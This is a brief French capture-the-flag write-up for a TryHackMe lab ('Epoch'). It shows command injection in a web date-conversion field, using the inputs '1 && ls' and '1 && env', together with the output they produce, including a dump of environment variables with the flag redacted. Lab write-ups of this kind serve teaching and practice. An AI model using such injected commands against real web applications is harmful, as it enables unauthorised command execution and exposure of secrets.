@@ -1,0 +1,29 @@
+https://tryhackme.com/room/epoch
+
+Une petite machine avec injection de commande via une interface web
+
+On teste très vite le retour de la commande :
+1 nous donne en sortie "Thu Jan  1 00:00:01 UTC 1970"
+
+On enchaine avec 1 && ls pour voir le retour, et bingo :
+"Thu Jan  1 00:00:01 UTC 1970
+go.mod
+go.sum
+main
+main.go
+views"
+
+On checke les variables d'environnements avec 1 && env :
+
+
+"Thu Jan  1 00:00:01 UTC 1970
+HOSTNAME=e7c1352e71ec
+PWD=/home/challenge
+HOME=/home/challenge
+GOLANG_VERSION=1.15.7
+FLAG=*redacted*
+SHLVL=0
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env"
+
+Easy Win !
